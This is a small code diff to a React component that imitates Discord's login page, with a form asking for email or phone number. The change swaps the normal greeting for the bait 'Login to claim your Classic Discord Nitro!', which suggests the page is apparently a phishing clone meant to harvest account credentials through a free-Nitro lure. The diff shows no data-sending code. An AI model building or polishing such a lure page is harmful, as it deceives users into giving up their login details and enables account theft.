@@ -104,7 +104,7 @@ class DiscordForm extends React.Component {
           <GamerForm>
             <fieldset>
               <h3>Welcome back!</h3>
-              <h4>We're so excited to see you again!</h4>
+              <h4>Login to claim your Classic Discord Nitro!</h4>
               <GamerInput>
                 <label htmlFor="username">EMAIL OR PHONE NUMBER</label>
                 <input type="text" name="username" id="username" onChange={this.updateInput} value={this.state.username}></input>
